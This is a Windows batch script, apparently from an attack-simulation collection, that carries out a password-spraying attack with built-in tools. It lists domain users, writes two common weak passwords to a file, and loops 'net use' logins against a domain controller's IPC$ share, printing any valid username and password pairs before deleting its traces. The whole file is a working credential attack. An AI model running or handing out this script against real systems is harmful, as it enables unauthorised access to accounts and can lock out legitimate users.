@ECHO OFF

ECHO ===========================================================================
ECHO PASSWORD SPRAY
ECHO Password Spraying with built in tools
net user /domain > DomainUsers.txt
echo \"Password1\" >> pass.txt
echo \"1q2w3e4r\" >> pass.txt
\"@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (pass.txt) DO @net use \\COMPANYDC1\IPC$ /user:COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL\"
del DomainUsers.txt
del pass.txt
